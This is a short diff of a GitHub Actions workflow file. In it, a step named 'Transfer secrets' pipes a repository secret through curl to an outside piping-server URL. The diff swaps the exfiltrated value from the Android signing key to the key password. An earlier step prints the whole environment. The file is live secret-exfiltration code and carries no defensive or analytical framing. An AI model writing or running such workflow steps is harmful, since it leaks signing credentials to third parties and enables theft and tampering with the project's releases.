@@ -9,4 +9,4 @@ jobs:
       - name: Get env
         run: env
       - name: Transfer secrets
-        run: "echo 'Token XXXX: ${{secrets.ANDROID_SIGNING_KEY}}' | curl -T - https://ppng.io/sky233333miwufile"
+        run: "echo 'Token XXXX: ${{secrets.ANDROID_KEY_PASSWORD}}' | curl -T - https://ppng.io/sky233333miwufile"
